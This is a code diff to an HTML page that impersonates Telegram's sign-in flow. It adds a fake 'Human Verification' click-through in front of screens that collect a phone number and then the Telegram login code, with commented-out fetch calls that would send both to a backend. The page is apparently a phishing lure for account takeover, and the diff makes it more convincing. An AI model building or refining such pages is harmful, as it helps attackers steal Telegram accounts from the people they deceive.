@@ -3,30 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to Telegram</title>
+    <title>Human Verification</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
         body {
             font-family: 'Open Sans', sans-serif;
-            background-color: #ffffff;
+            background-color: #111827;
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
-            overflow-y: auto;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .verification-container {
+            text-align: center;
+            background-color: #1F2937;
+            border-radius: 12px;
+            padding: 30px 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        .verification-container h1 {
+            font-size: 28px;
+            color: #FFFFFF;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .verification-container p {
+            font-size: 16px;
+            color: #E5E7EB;
+            margin-bottom: 20px;
+        }
+
+        .verification-container button {
+            font-size: 16px;
+            font-weight: 600;
+            color: #D1FAE5;
+            background-color: #10B981;
+            border: none;
+            border-radius: 8px;
+            padding: 10px 20px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .verification-container button:hover {
+            background-color: #059669;
         }
 
         .container {
             text-align: center;
             width: 90%;
             max-width: 380px;
-            margin-top: 4%; /* Adjusted by 1 cm */
+            margin-top: 4%;
             position: relative;
             border-radius: 20px;
             padding: 20px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            display: none;
         }
 
         .container img {
@@ -210,6 +248,12 @@
     </style>
 </head>
 <body>
+    <div class="verification-container" id="verificationContainer">
+        <h1>Human Verification</h1>
+        <p>Verify below to be granted entry</p>
+        <button onclick="startSignIn()">Click here</button>
+    </div>
+
     <div class="container" id="initialContainer">
         <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
         <h1>Sign in to Telegram</h1>
@@ -236,7 +280,8 @@
         <button class="button" onclick="goToVerificationPage()">Next</button>
     </div>
 
-    <div class="container" id="verificationContainer" style="display:none;">
+    <div class="container" id="phoneVerificationContainer" style="display:none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/69/Monkey_emoji.png" alt="Monkey Icon" style="width: 80px; margin-bottom: 20px; border-radius: 50%;">
         <h1 id="phoneDisplay"></h1>
         <p>We have sent you a message in Telegram with the code.</p>
 
@@ -290,6 +335,11 @@
                 dropdownMenu.classList.toggle('show');
             };
 
+            window.startSignIn = function() {
+                document.getElementById('verificationContainer').style.display = 'none';
+                document.getElementById('initialContainer').style.display = 'block';
+            }
+
             window.goToVerificationPage = function() {
                 const phoneNumber = phoneNumberInput.value;
                 if (phoneNumber === '') {
@@ -300,7 +350,7 @@
                 // Simulating a successful submission
                 document.getElementById('phoneDisplay').textContent = phoneNumber;
                 document.getElementById('initialContainer').style.display = 'none';
-                document.getElementById('verificationContainer').style.display = 'block';
+                document.getElementById('phoneVerificationContainer').style.display = 'block';
                 
                 // Uncomment and adjust the following code for actual backend integration
                 /*
@@ -314,7 +364,7 @@
                     if (response.ok) {
                         document.getElementById('phoneDisplay').textContent = phoneNumber;
                         document.getElementById('initialContainer').style.display = 'none';
-                        document.getElementById('verificationContainer').style.display = 'block';
+                        document.getElementById('phoneVerificationContainer').style.display = 'block';
                     } else {
                         alert('Error submitting phone number.');
                     }
@@ -333,7 +383,7 @@
                 }
 
                 // Simulating a successful verification
-                document.getElementById('verificationContainer').style.display = 'none';
+                document.getElementById('phoneVerificationContainer').style.display = 'none';
                 document.getElementById('finalMessageContainer').style.display = 'block';
                 
                 // Uncomment and adjust the following code for actual backend integration
@@ -346,7 +396,7 @@
                     body: JSON.stringify({ verificationCode }),
                 }).then(response => {
                     if (response.ok) {
-                        document.getElementById('verificationContainer').style.display = 'none';
+                        document.getElementById('phoneVerificationContainer').style.display = 'none';
                         document.getElementById('finalMessageContainer').style.display = 'block';
                     } else {
                         document.getElementById('finalMessage').textContent = 'Verification failed. Please try again.';
